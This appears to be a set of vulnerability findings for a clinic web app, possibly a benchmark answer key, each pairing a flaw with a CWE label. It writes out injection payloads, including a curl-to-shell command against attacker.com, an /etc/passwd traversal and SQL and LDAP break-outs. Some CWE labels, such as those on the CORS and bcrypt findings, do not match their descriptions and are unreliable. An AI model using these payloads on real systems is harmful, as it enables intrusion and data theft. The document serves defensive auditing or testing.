extra.message: The clinic timezone is read from the attacker-controllable 'clinic-tz' cookie and interpolated directly into prisma.$queryRawUnsafe() SQL. An authenticated front_desk/admin can inject arbitrary SQL (e.g. "' OR 1=1 --"). The sibling function getVisitSummariesInClinicTimezone uses parameterized $queryRaw, confirming this path should be parameterized.

cwe: CWE-89: SQL Injection

extra.message: The 'format' query parameter is interpolated into an execSync() shell command string with no validation, allowing OS command injection (e.g. format='pdf; curl attacker.com/x|sh'). The sibling appointment-packet route uses execFileSync with shell:false and an allowlist.

cwe: CWE-78: OS Command Injection

extra.message: renderScheduleSheetForPreset builds a shell command string from the caller-supplied paperPreset and runs it via spawn(cmd, [], { shell: true }). paperPreset comes from the ?paperPreset= query param in /api/export/appointments, so an attacker can inject shell metacharacters. The sibling renderExhibitSheetForPreset validates against ALLOWED_PAPER_PRESETS and uses shell:false.

cwe: CWE-78: OS Command Injection

extra.message: The templateFile query parameter is joined directly to the handout directory with no sanitization, allowing path traversal (e.g. templateFile=../../../../etc/passwd) and arbitrary file read. The letterhead-asset route demonstrates the correct resolve()+prefix check.

cwe: CWE-22: Path Traversal

extra.message: body.faxFileName from the JSON request body is joined directly to FAX_INBOX_DIR with no basename()/normalization, allowing path traversal and arbitrary file read (e.g. ../../../../etc/passwd). The scanned-intake route correctly applies basename().

cwe: CWE-22: Path Traversal

extra.message: The uploaded file's name (file.name) is used verbatim as the destination path component in writeFile(join(MESSAGE_ATTACHMENT_DIR, storedName)). A malicious patient can supply a filename such as ../../src/app/page.tsx to write outside the intended directory (path traversal / arbitrary file write). The visit-summaries/exhibit route correctly uses a randomUUID() filename.

cwe: CWE-22: Path Traversal

extra.message: evaluatePredicate() passes an XPath predicate derived from user input into new Function(`return (${asComparisons});`), which executes as JavaScript. The ccd-section route interpolates the raw cached sectionId into the XPath expression without escapeXPathString(), so a sectionId containing a single quote can break out and execute arbitrary code. The ccd-section-summary route correctly escapes the value first.

cwe: CWE-94: Code Injection

extra.message: The user-controlled cachedSectionId is embedded into an XPath expression (`/records/record[@id='${cachedSectionId}']`) without escaping, unlike ccd-section-summary which calls escapeXPathString(). The expression is later evaluated by new Function in ccd-section-index.ts, turning this into code execution.

cwe: CWE-643: XPath Injection

extra.message: expandEntities() parses attacker-supplied DOCTYPE/ENTITY declarations and calls fs.readFileSync() on any SYSTEM URI, allowing external entity file disclosure. parseWidgetSyncPayload() is used by /api/embed/checkin-sync with cookie-controlled XML, so an attacker can read local files. parseWidgetSyncPayloadStrict() (used by the sibling presence route) rejects DOCTYPE.

cwe: CWE-611: XML External Entity (XXE)

extra.message: completePasswordReset() looks up the account by email and updates the password without ever validating the recoveryValue against the token stored in the reset notification. Any unauthenticated attacker can reset any user's password (including clinic_admin) by supplying the victim's email, a new password, and any non-empty recoveryValue, resulting in full account takeover.

cwe: CWE-640: Weak Password Recovery Mechanism for Forgotten Password

extra.message: The x-network-handoff JWT is decoded with jose's decodeJwt(), which does not verify the signature. The cost-allocation route correctly uses jwtVerify() with the network secret.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: hasDelegatedAccess is computed purely from attacker-controlled query params (sharingMode === 'family' && visibilityId === params.id). Any authenticated user, including a patient, can append ?sharingMode=family&visibilityId=<targetId> to read any other patient's full care summary (demographics + visit summaries). No server-side grant is ever checked.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: viewVisitRecap() fetches a visit summary by the user-supplied visitSummaryId but never verifies that it belongs to the authenticated patient. Any logged-in patient can read any other patient's released diagnosis, treatment and care instructions. The sibling refill-recap route scopes the query with patient: { userId: session.id }.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: computeReferralVolumeByProvider() performs no getSession()/role check at all (unlike every other report route, which requires clinic_admin or front_desk). The endpoint returns per-provider referral volume to any unauthenticated caller.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: The x-referral-document-url request header is passed directly to fetch() with no scheme or host allowlist. The partner-webhook-receipt route shows the intended host allowlist check.

cwe: CWE-918: Server-Side Request Forgery (SSRF)

extra.message: All body fields other than providerId are spread directly into prisma.provider.update({ data: updates }) with no field allowlist, so a clinic_admin can overwrite arbitrary Provider columns (e.g. userId to hijack a provider account, or active). cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: The x-filter header is parsed as arbitrary JSON and spread directly into prisma.patientProfile.findMany({ where: { ...filter } }), letting the caller supply arbitrary query operators (OR, nested relations, etc.) rather than the intended scalar filters. cwe: CWE-943: Improper Neutralization of Special Elements in Data Query Logic

extra.message: The email query parameter is interpolated into an LDAP filter (`(mail=${badgeEmail})`) with no escaping, allowing LDAP filter injection (e.g. email=*)(|(uid=*) to match any directory entry and enumerate staff/on-call groups). cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

extra.message: A long-lived reference-lab integration credential is hardcoded in source (LAB_MIRROR_CREDENTIAL = 'rrl_9f2c...') and sent as a Bearer token. Anyone with source access can read the lab's results feed. The sibling pharmacy-network-gateway loads its credential from process.env.

cwe: CWE-798: Use of Hardcoded Credentials

extra.message: buildVisitSummaryPrintSheet() interpolates patient/provider names, diagnosis, treatment and care instructions into HTML without escapeHtml(). The result is served as text/html by /api/export/visit-summaries?format=html (and rendered to PDF), enabling stored XSS from any attacker-controlled chart field. buildAppointmentSchedulePrintSheet in the same file correctly escapes.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: resumeIntakeDraftFromCookie() JSON.parses the attacker-controllable 'intake-draft' cookie and spreads it directly into prisma.patientProfile.update({ data: { ...draft } }), bypassing the zod schema used by updatePatientProfile. cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: composeCarePlanFollowUp() compiles a clinician-supplied noteDraft with Handlebars.compile() on the server. cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

extra.message: estimateNoShowFee() evaluates the clinicSetting 'no_show_fee_formula' value with new Function(), executing it as JavaScript. cwe: CWE-94: Improper Control of Generation of Code ('Code Injection')

extra.message: resolvePostLoginDestination() returns the requestedReturnTo value unchecked, and it is passed to redirect() in src/actions/auth.ts:30. cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: When the caller sets a 'clinic-diagnostics' cookie, the error handler returns err.message and err.stack to the client. Stack traces and internal error details are exposed to authenticated users and can reveal file paths, query structure and library internals.

extra.message: The endpoint reflects any request Origin into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true, allowing any website to make credentialed cross-origin requests and read the response. The reminder-widget route demonstrates the intended fixed allowlist.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: verifyPendingPartnerReferrals() performs a state-changing bulk document.updateMany() in response to an unauthenticated-GET-style request with no CSRF token or origin check. A cross-site link/img can trigger the update while a staff member is logged in.

extra.message: hashRounds is taken from the request body and passed straight to bcrypt.hash(). A clinic_admin can supply an enormous cost factor (e.g. 31) and cause a CPU-exhaustion denial of service on the server; a low value could also weaken password hashing.

cwe: CWE-598: Use of GET Request Method With Sensitive Query Strings
